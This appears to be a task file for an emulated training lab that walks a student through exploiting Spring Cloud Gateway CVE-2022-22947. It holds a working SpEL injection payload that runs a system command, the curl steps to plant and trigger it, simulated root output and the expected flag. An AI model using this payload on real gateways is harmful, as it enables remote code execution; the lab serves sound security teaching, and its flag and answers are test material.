@@ -1,0 +1,51 @@
+{
+  "id": "web-spring-cloud-gateway",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{spring_g4t3w4y_sp3l_4ct1v4t0r_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Spring Cloud Gateway CVE-2022-22947\n\nЦель: `http://gateway.local:8080`.\n\n1. Actuator открыт — посмотри ссылки:\n   curl -s http://gateway.local:8080/actuator\n\n2. Создай маршрут со SpEL-фильтром (payload в route.json):\n   curl -s -X POST http://gateway.local:8080/actuator/gateway/routes/hack -H 'Content-Type: application/json' --data-binary @route.json\n\n3. Активируй маршрут:\n   curl -s -X POST http://gateway.local:8080/actuator/gateway/refresh\n\n4. Обратись к маршруту — в заголовке Result вывод команды с флагом:\n   curl -s -D - http://gateway.local:8080/hack -o /dev/null\n\n5. Сохрани флаг в found.txt и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/route.json",
+      "text": "{\"id\":\"hack\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"Result\",\"value\":\"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream().readAllBytes())}\"}}],\"uri\":\"http://example.com\",\"predicates\":[{\"name\":\"Path\",\"args\":{\"_genkey_0\":\"/hack\"}}]}\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция gateway.local)",
+      "cases": [
+        {
+          "match": "gateway/refresh",
+          "example": "-s -X POST http://gateway.local:8080/actuator/gateway/refresh",
+          "output": "{\"refreshed\":[\"hack\"]}\n"
+        },
+        {
+          "match": "routes/hack|route\\.json|AddResponseHeader",
+          "example": "-s -X POST http://gateway.local:8080/actuator/gateway/routes/hack --data-binary @route.json",
+          "output": "201 Created\n"
+        },
+        {
+          "match": "/hack",
+          "example": "-s -D - http://gateway.local:8080/hack -o /dev/null",
+          "output": "HTTP/1.1 200 OK\nResult: uid=0(root) gid=0(root) groups=0(root) nto{spring_g4t3w4y_sp3l_4ct1v4t0r_rce}\n\n"
+        },
+        {
+          "match": "actuator",
+          "example": "-s http://gateway.local:8080/actuator",
+          "output": "{\"_links\":{\"self\":{\"href\":\"http://gateway.local:8080/actuator\"},\"gateway\":{\"href\":\"http://gateway.local:8080/actuator/gateway\"},\"env\":{\"href\":\"http://gateway.local:8080/actuator/env\"}}}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только gateway.local"
+    }
+  }
+}
